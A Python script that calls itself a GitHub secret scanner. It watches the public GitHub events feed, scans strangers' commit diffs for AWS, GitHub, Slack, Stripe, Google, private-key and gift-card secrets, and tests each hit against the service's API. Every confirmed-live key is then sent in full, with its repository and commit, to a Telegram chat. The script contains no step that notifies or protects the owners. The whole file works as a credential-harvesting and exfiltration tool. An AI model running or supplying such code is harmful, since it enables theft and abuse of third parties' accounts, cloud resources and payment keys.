#!/usr/bin/env python3
"""GitHub Secret Scanner – GitHub Actions (stateless, single run)"""
import asyncio
import aiohttp
import logging
import re
import math
import sys
import json
import time
import os
from datetime import datetime, timezone, timedelta
from typing import List, Dict, Optional, Tuple, Callable, Any
import requests
from collections import Counter

# --- Config ---
VERIFY_CONCURRENCY: int = 10
LOG_FILE: str = "live_keys.log"
ENTROPY_THRESHOLD: float = 3.5
MIN_ENTROPY_STRING_LENGTH: int = 16
MAX_ENTROPY_STRING_LENGTH: int = 128
LAST_TIMESTAMP_FILE: str = "last_timestamp.txt"

# --- Telegram ---
TELEGRAM_TOKEN: str = os.environ.get("TELEGRAM_TOKEN", "")
TELEGRAM_CHAT_ID: str = os.environ.get("TELEGRAM_CHAT_ID", "")

def send_telegram(msg: str) -> None:
    """Sends a message to a Telegram chat if credentials are provided."""
    if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
        return
    url: str = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": msg}, timeout=10)
    except requests.exceptions.RequestException as e:
        logging.error(f"Failed to send Telegram message: {e}")

# --- Patterns ---
PATTERNS: List[Tuple[str, str, Optional[str]]] = [
    (r'(?:A3T[A-Z0-9]|AKIA|ASIA)[A-Z0-9]{16}', 'AWS Access Key', None),
    (r'(?i)aws(.{0,20})?(?-i)["\']([0-9a-zA-Z\/+]{40})["\']', 'AWS Secret Key', None),
    (r'(ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9_]{36,}', 'GitHub Token', 'verify_github'),
    (r'xox[baprs]-[a-zA-Z0-9-]+', 'Slack Token', 'verify_slack'),
    (r'sk_live_[0-9a-zA-Z]{24,}', 'Stripe Live Key', 'verify_stripe'),
    (r'AIza[0-9A-Za-z\-_]{35}', 'Google API Key', 'verify_google'),
    (r'-----BEGIN (RSA|EC|DSA|OPENSSH) PRIVATE KEY-----', 'Private Key', None),
    (r'(?i)(giftcard|reward|loyalty)(_key|_token|secret)\s*[:=]\s*["\']([a-zA-Z0-9_\-]{32,64})["\']', 'Gift Card Key', None),
]

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    stream=sys.stdout
)
logger: logging.Logger = logging.getLogger(__name__)

def shannon_entropy(data: str) -> float:
    """Calculates the Shannon entropy of a string."""
    if not data:
        return 0.0
    n: int = len(data)
    counts: Counter = Counter(data)
    entropy: float = 0.0
    for count in counts.values():
        p_x: float = count / n
        if p_x > 0:
            entropy -= p_x * math.log2(p_x)
    return entropy

def extract_token(match: Any) -> Optional[str]:
    """Extracts the token string from a regex match (tuple or string)."""
    if isinstance(match, tuple):
        return next((m for m in match if isinstance(m, str) and len(m) > 10), None)
    return match if isinstance(match, str) else None

def extract_high_entropy_strings(diff_text: str) -> List[str]:
    """Extracts high-entropy strings from diff lines."""
    candidates: List[str] = []
    token_pattern: re.Pattern = re.compile(
        rf'["\']([^"\']{{{MIN_ENTROPY_STRING_LENGTH},}})["\']|\b([A-Za-z0-9_\-+/=]{{{MIN_ENTROPY_STRING_LENGTH},}})\b'
    )
    
    for line in diff_text.split('\n'):
        if line.startswith('+') and not line.startswith('+++'):
            content: str = line[1:].strip()
            for t in token_pattern.findall(content):
                token: str = t[0] if t[0] else t[1]
                if len(token) >= MIN_ENTROPY_STRING_LENGTH:
                    candidates.append(token)
    
    return [t for t in candidates if shannon_entropy(t) >= ENTROPY_THRESHOLD 
            and len(t) <= MAX_ENTROPY_STRING_LENGTH]

def scan_diff(diff_text: str) -> List[Dict[str, Any]]:
    """Scans diff text for known patterns and high-entropy strings."""
    findings: List[Dict[str, Any]] = []
    compiled_patterns: List[Tuple[re.Pattern, str, Optional[str]]] = [
        (re.compile(pattern, re.IGNORECASE | re.MULTILINE), service, verifier)
        for pattern, service, verifier in PATTERNS
    ]
    
    seen_tokens: set = set()

    # 1. Pattern matching
    for pattern, service, verifier in compiled_patterns:
        for match in pattern.findall(diff_text):
            token: Optional[str] = extract_token(match)
            if token and token not in seen_tokens:
                findings.append({'token': token, 'service': service, 'verifier': verifier})
                seen_tokens.add(token)

    # 2. High-entropy detection
    for token in extract_high_entropy_strings(diff_text):
        if token not in seen_tokens:
            findings.append({'token': token, 'service': 'High Entropy String', 'verifier': None})
            seen_tokens.add(token)
    
    return findings

class GitHub:
    """Handles interactions with the GitHub API."""
    def __init__(self, token: str) -> None:
        self.token: str = token
        self.session: Optional[aiohttp.ClientSession] = None

    async def _init_session(self) -> None:
        """Initializes the aiohttp ClientSession if it doesn't exist."""
        if not self.session or self.session.closed:
            self.session = aiohttp.ClientSession(
                headers={'Authorization': f'token {self.token}', 'Accept': 'application/vnd.github.v3+json'},
                timeout=aiohttp.ClientTimeout(total=30)
            )

    async def fetch_events_since(self, since_iso: str) -> List[Dict[str, Any]]:
        """Fetches push events from the GitHub API since a given timestamp."""
        await self._init_session()
        url: str = 'https://api.github.com/events'
        params: Dict[str, Any] = {'per_page': 100, 'since': since_iso}
        
        for attempt in range(3):
            try:
                async with self.session.get(url, params=params) as resp:
                    if resp.status == 403 and resp.headers.get('X-RateLimit-Remaining') == '0':
                        reset_time: int = int(resp.headers.get('X-RateLimit-Reset', time.time() + 60))
                        sleep_duration: float = max(reset_time - time.time(), 1)
                        logger.warning(f"Rate limited. Sleeping {sleep_duration:.1f}s")
                        await asyncio.sleep(sleep_duration)
                        continue
                    
                    if resp.status != 200:
                        logger.error(f"Events API error: {resp.status}")
                        return []
                    
                    events: List[Dict[str, Any]] = await resp.json()
                    return [e for e in events if e.get('type') == 'PushEvent']
            
            except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                logger.warning(f"Attempt {attempt+1} failed: {e}")
                if attempt < 2:
                    await asyncio.sleep(1.5 * (attempt + 1))
        
        return []

    async def get_diff(self, repo: str, sha: str) -> Optional[str]:
        """Fetches the diff for a specific commit."""
        await self._init_session()
        url: str = f'https://api.github.com/repos/{repo}/commits/{sha}'
        
        try:
            async with self.session.get(url, headers={'Accept': 'application/vnd.github.v3.diff'}) as resp:
                if resp.status == 200:
                    return await resp.text()
                logger.warning(f"Diff failed {repo}@{sha[:7]}: {resp.status}")
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            logger.warning(f"Diff error {repo}@{sha[:7]}: {e}")
        return None

    async def close(self) -> None:
        """Closes the aiohttp ClientSession."""
        if self.session and not self.session.closed:
            await self.session.close()

async def create_verifiers(session: Optional[aiohttp.ClientSession] = None) -> Tuple[
    Callable, Callable, Callable, Callable, aiohttp.ClientSession
]:
    """Creates verifier functions for different token types."""
    semaphore: asyncio.Semaphore = asyncio.Semaphore(VERIFY_CONCURRENCY)
    client_session: aiohttp.ClientSession = session or aiohttp.ClientSession(
        timeout=aiohttp.ClientTimeout(total=10)
    )

    async def verify_endpoint(method: str, url: str, **kwargs) -> bool:
        """Generic verification helper."""
        async with semaphore:
            try:
                async with client_session.request(method, url, **kwargs) as resp:
                    return resp.status == 200
            except Exception:
                return False

    async def verify_github(token: str) -> bool:
        return await verify_endpoint('GET', 'https://api.github.com/user', 
                                     headers={'Authorization': f'token {token}'})

    async def verify_slack(token: str) -> bool:
        async with semaphore:
            try:
                async with client_session.post('https://slack.com/api/auth.test',
                    headers={'Authorization': f'Bearer {token}'}) as resp:
                    return (await resp.json()).get('ok', False) if resp.status == 200 else False
            except Exception:
                return False

    async def verify_stripe(key: str) -> bool:
        return await verify_endpoint('GET', 'https://api.stripe.com/v1/balance',
                                     headers={'Authorization': f'Bearer {key}'})

    async def verify_google(key: str) -> bool:
        return await verify_endpoint('GET', 'https://www.googleapis.com/oauth2/v1/tokeninfo',
                                     params={'access_token': key})

    return verify_github, verify_slack, verify_stripe, verify_google, client_session

async def get_last_timestamp() -> str:
    """Reads the last processed timestamp from file."""
    try:
        with open(LAST_TIMESTAMP_FILE, 'r') as f:
            ts: str = f.read().strip()
            datetime.fromisoformat(ts.replace('Z', '+00:00'))
            return ts
    except (FileNotFoundError, ValueError):
        return (datetime.now(timezone.utc) - timedelta(hours=1)).strftime('%Y-%m-%dT%H:%M:%SZ')

def update_last_timestamp() -> None:
    """Writes current timestamp to file."""
    with open(LAST_TIMESTAMP_FILE, 'w') as f:
        f.write(datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ'))

async def main() -> None:
    """Main scanning orchestration."""
    start_time: float = time.time()
    logger.info("Starting GitHub Secret Scanner...")

    token: Optional[str] = os.environ.get("GITHUB_TOKEN")
    if not token:
        logger.error("GITHUB_TOKEN not set")
        sys.exit(1)

    github: GitHub = GitHub(token)
    verifier_session: Optional[aiohttp.ClientSession] = None
    
    try:
        since_iso: str = await get_last_timestamp()
        events: List[Dict[str, Any]] = await github.fetch_events_since(since_iso)
        
        if not events:
            logger.info("No new events")
            update_last_timestamp()
            return

        logger.info(f"Processing {len(events)} PushEvents")
        v_gh, v_slack, v_stripe, v_google, verifier_session = await create_verifiers()
        
        verifier_map: Dict[str, Callable] = {
            'verify_github': v_gh,
            'verify_slack': v_slack,
            'verify_stripe': v_stripe,
            'verify_google': v_google,
        }

        for ev in events:
            repo: str = ev.get('repo', {}).get('name', '')
            for commit in ev.get('payload', {}).get('commits', []):
                sha: str = commit.get('sha', '')
                if not repo or not sha:
                    continue
                
                diff: Optional[str] = await github.get_diff(repo, sha)
                if not diff:
                    continue
                
                findings: List[Dict[str, Any]] = scan_diff(diff)
                if not findings:
                    continue
                
                logger.info(f"Found {len(findings)} candidate(s) in {repo}@{sha[:7]}")
                
                for f in findings:
                    token_val: str = f['token']
                    service: str = f['service']
                    verifier_name: Optional[str] = f['verifier']
                    
                    is_valid: Optional[bool] = None
                    if verifier_name and verifier_name in verifier_map:
                        is_valid = await verifier_map[verifier_name](token_val)
                    
                    if is_valid is True:
                        alert: str = f"[LIVE KEY] {service}: {token_val} ({repo}@{sha[:7]})"
                        logger.warning(alert)
                        send_telegram(alert)
                        with open(LOG_FILE, 'a') as lf:
                            lf.write(json.dumps({
                                'timestamp': datetime.now(timezone.utc).isoformat(),
                                'service': service,
                                'repo': repo,
                                'commit': sha
                            }) + '\n')
                    elif is_valid is False:
                        logger.info(f"[DEAD] {service}: {token_val[:20]}...")
                    else:
                        logger.info(f"[UNKNOWN] {service}: {token_val[:20]}...")

        update_last_timestamp()

    finally:
        await github.close()
        if verifier_session and verifier_session is not github.session and not verifier_session.closed:
            await verifier_session.close()

    logger.info(f"Run complete in {time.time() - start_time:.1f}s")

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Interrupted. Exiting.")
        sys.exit(0)
